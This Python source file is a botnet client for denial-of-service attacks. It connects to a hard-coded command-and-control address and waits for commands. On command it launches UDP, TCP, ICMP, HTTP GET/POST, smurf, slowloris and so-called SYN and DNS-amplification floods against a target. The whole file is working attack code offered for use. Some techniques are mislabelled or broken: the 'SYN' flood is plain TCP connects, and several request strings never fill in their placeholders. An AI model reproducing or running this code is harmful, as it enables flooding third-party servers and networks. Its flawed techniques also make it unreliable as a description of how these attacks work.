import time
import socket
import random
import threading
import requests

def flood_attack(attack_type, target_ip, target_port, duration=10):
    start_time = time.time()

    if attack_type == 'udp':
        def udp_flood():
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            while time.time() - start_time < duration:
                data = random._urandom(1024)
                client.sendto(data, (target_ip, target_port))
            print(f"UDP Flood attack on {target_ip}:{target_port} completed.")

        threading.Thread(target=udp_flood).start()

    elif attack_type == 'tcp':
        def tcp_flood():
            while time.time() - start_time < duration:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((target_ip, target_port))
                    client.send(b'GET / HTTP/1.1\r\n')
                    client.close()
                except:
                    pass
            print(f"TCP Flood attack on {target_ip}:{target_port} completed.")

        threading.Thread(target=tcp_flood).start()

    elif attack_type == 'syn':
        def syn_flood():
            while time.time() - start_time < duration:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                    client.connect((target_ip, target_port))
                    client.send(b'SYN')
                    client.close()
                except:
                    pass
            print(f"SYN Flood attack on {target_ip}:{target_port} completed.")

        threading.Thread(target=syn_flood).start()

    elif attack_type == 'icmp':
        def icmp_flood():
            try:
                while time.time() - start_time < duration:
                    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    packet = random._urandom(1024)
                    client.sendto(packet, (target_ip, 0))
            except PermissionError:
                print("Permission denied: ICMP flood requires root privileges.")
            print(f"ICMP Flood attack on {target_ip} completed.")

        threading.Thread(target=icmp_flood).start()

    elif attack_type == 'get':
        def http_flood():
            while time.time() - start_time < duration:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((target_ip, target_port))
                    client.send(b"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n")
                    client.close()
                except:
                    pass
            print(f"HTTP Flood attack on {target_ip}:{target_port} completed.")

        threading.Thread(target=http_flood).start()

    elif attack_type == 'post':
        def http_post_flood():
            while time.time() - start_time < duration:
                try:
                    response = requests.post(f"http://{target_ip}:{target_port}", data={"key": "value"})
                except:
                    pass
            print(f"HTTP POST Flood attack on {target_ip}:{target_port} completed.")

        threading.Thread(target=http_post_flood).start()

    elif attack_type == 'smurf':
        def smurf_attack():
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                broadcast_address = "255.255.255.255"
                packet = random._urandom(1024)
                while time.time() - start_time < duration:
                    client.sendto(packet, (broadcast_address, 0))
            except PermissionError:
                print("Permission denied: Smurf attack requires root privileges.")
            print(f"Smurf attack on {target_ip} completed.")

        threading.Thread(target=smurf_attack).start()

    elif attack_type == 'slowloris':
        def slowloris_attack():
            headers = "GET / HTTP/1.1\r\nHost: {target_ip}\r\n" + "Keep-Alive: timeout=5, max=1000\r\n"
            while time.time() - start_time < duration:
                try:
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((target_ip, target_port))
                    client.send(headers.encode('utf-8'))
                    time.sleep(15)  # Keep the connection open
                except:
                    pass
            print(f"Slowloris attack on {target_ip}:{target_port} completed.")

        threading.Thread(target=slowloris_attack).start()

    elif attack_type == 'dns':
        def dns_amplification_attack():
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dns_query = ("\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01")
                dns_server = "8.8.8.8"
                while time.time() - start_time < duration:
                    client.sendto(dns_query.encode('utf-8'), (dns_server, 53))
            except:
                pass
            print(f"DNS Amplification attack targeting {target_ip}:{target_port} completed.")

        threading.Thread(target=dns_amplification_attack).start()

    else:
        print("Invalid attack type. Please choose 'udp', 'tcp', 'syn', 'icmp', 'get', 'post', 'smurf', 'slowloris', or 'dns'.")

def handle_command(client):
    while True:
        command = client.recv(1024).decode('utf-8').lower()
        if command:
            if command.startswith("attack"):
                command = command.split()
                attack_type = command[1]
                target_ip = command[2]
                target_port = int(command[3])
                duration = int(command[4])
                threading.Thread(target=flood_attack, args=(attack_type, target_ip, target_port, duration)).start()
        else:
            continue

def connect_as_client(host, port, username):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(username.encode('utf-8')) 

    print("Connected as client, waiting for commands...")

    threading.Thread(target=handle_command, args=(client,)).start()

if __name__ == "__main__":
    connect_as_client("15.204.236.177", 65432, "client")
